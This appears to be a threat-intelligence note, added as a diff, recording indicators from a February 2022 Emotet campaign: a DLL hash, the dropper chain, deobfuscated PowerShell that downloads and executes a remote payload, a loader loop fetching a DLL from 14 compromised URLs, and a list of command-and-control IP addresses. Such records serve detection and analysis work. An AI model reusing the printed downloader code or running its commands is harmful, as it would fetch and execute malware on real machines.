@@ -1,0 +1,106 @@
+Emotet - e4 - 09.02.2022
+
+.xls 
+
+.dll da6ce8966d86b8359b27559659ba1b51d41d6bc512667144d9ea9c6c31ec039b
+
+wscript c:\programdata\tjspowj.vbs
+
+cmd.exe /c C:\programdata\uidpjewl.bat
+
+.ps1 
+
+# powershell snippet 0
+$c1 = "(New-Object Net.We"
+$c4 = "bClient).Downlo"
+$c3 = "adString('hxxp://91.240.118.172/ss/ss.png')"
+$ji = "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.172/ss/ss.png')"
+invoke-expression "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.172/ss/ss.png')"|invoke-expression
+# powershell snippet 1
+(new-object net.webclient).downloadstring("hxxp://91.240.118.172/ss/ss.png")
+
+
+.png 
+
+$mjxdfshdrfgzses4 = "https://youlanda.org/eln-images/n8DPZISf/", "http://rosevideo.net/eln-images/EjdCoMlY8Gy/", "http://vbaint.com/eln-images/H2pPGte8XzENC/", "https://framemakers.us/eln-images/U5W2IGE9m8i9h9r/", "http://niplaw.com/asolidfoundation/yCE9/", "http://robertmchilespe.com/cgi/3f/", "http://vocoptions.net/cgi/ifM9R5ylbVpM8hfR/", "http://missionnyc.org/fonts/JO5/", "http://robertflood.us/eln-images/DGI2YOkSc99XPO/", "http://mpmcomputing.com/fonts/fJJrjqpIY3Bt3Q/", "http://dadsgetinthegame.com/eln-images/tAAUG/", "http://smbservices.net/cgi/JO01ckuwd/", "http://stkpointers.com/eln-images/D/", "http://rosewoodcraft.com/Merchant2/5.00/PGqX/"
+foreach ($yidsrhye34syufgxjcdf in $mjxdfshdrfgzses4) {
+  $gweyh57sedswd = "c:\\programdata\\puihoud.dll"
+  invoke-webrequest -uri $yidsrhye34syufgxjcdf -outfile $gweyh57sedswd
+  if (test-path "c:\\programdata\\puihoud.dll") {
+    if ((get-item "c:\\programdata\\puihoud.dll").length -ge 47436) {
+      break
+    }
+  }
+}
+
+
+.dll drop
+
+https://youlanda.org/eln-images/n8DPZISf/
+http://rosevideo.net/eln-images/EjdCoMlY8Gy/
+http://vbaint.com/eln-images/H2pPGte8XzENC/
+https://framemakers.us/eln-images/U5W2IGE9m8i9h9r/
+http://niplaw.com/asolidfoundation/yCE9/
+http://robertmchilespe.com/cgi/3f/
+http://vocoptions.net/cgi/ifM9R5ylbVpM8hfR/
+http://missionnyc.org/fonts/JO5/
+http://robertflood.us/eln-images/DGI2YOkSc99XPO/
+http://mpmcomputing.com/fonts/fJJrjqpIY3Bt3Q/
+http://dadsgetinthegame.com/eln-images/tAAUG/
+http://smbservices.net/cgi/JO01ckuwd/
+http://stkpointers.com/eln-images/D/
+http://rosewoodcraft.com/Merchant2/5.00/PGqX/
+
+
+
+c2's
+
+185.248.140.40:443
+8.9.11.48:443
+200.17.134.35:7080
+207.38.84.195:8080
+79.172.212.216:8080
+45.176.232.124:443
+45.118.135.203:7080
+162.243.175.63:443
+110.232.117.186:8080
+103.75.201.4:443
+195.154.133.20:443
+160.16.102.168:80
+164.68.99.3:8080
+131.100.24.231:80
+216.158.226.206:443
+159.89.230.105:443
+178.79.147.66:8080
+178.128.83.165:80
+212.237.5.209:443
+82.165.152.127:8080
+50.116.54.215:443
+58.227.42.236:80
+119.235.255.201:8080
+144.76.186.49:8080
+138.185.72.26:8080
+162.214.50.39:7080
+81.0.236.90:443
+176.104.106.96:8080
+144.76.186.55:7080
+129.232.188.93:443
+212.24.98.99:8080
+203.114.109.124:443
+103.75.201.2:443
+173.212.193.249:8080
+41.76.108.46:8080
+45.118.115.99:8080
+158.69.222.101:443
+107.182.225.142:8080
+212.237.17.99:8080
+212.237.56.116:7080
+159.8.59.82:8080
+46.55.222.11:443
+104.251.214.46:8080
+31.24.158.56:8080
+153.126.203.229:8080
+51.254.140.238:7080
+185.157.82.211:8080
+217.182.143.207:443
+45.142.114.231:8080
